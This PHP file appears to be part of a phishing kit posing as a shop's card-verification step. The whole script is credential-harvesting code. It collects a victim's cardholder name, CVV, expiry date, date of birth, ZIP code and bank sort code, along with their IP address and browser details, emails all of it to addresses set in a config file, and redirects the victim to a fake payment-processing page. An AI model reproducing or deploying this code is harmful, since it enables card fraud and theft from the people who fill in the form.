<?php
include("../config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$pes .= "------------+| It's now easier to shop |+------------\n";

$pes .= "Full Name          : ".$_POST['CHName1']."\n";
$pes .= "three          : ".$_POST['cvv2']."\n";
$pes .= "dob          : ".$_POST['dob']."\n";
$pes .= "erex               : ".$_POST['expdate']."\n";
$pes .= "Zip Code           : ".$_POST['zip']."\n";
$pes .= "sort 1         : ".$_POST['sortCode1']."\n";
$pes .= "sort 2        : ".$_POST['sortCode2']."\n";
$pes .= "sort 3        : ".$_POST['sortCode3']."\n";

$pes .= "------------+| We offer free global returns with pick-up service. |+------------\n";
$pes .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";
$pes .= "System Down :  $useragent   \n";


$bilsub = "VBV/SEC LS $ip";
$bilhead = "From: VBV LS <prodection@bader.com>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead = "X-Mailer: PHP/".phpversion();
$bilhead .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$bilhead .= "MIME-Version: 2.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$pes,$bilhead);

header("Location: ../rthanks.php?Go=_Payment_loa_Processing&_SESSION=d2b1a896a29a6af53a2f0d23f0c705e2ee17233d");
?>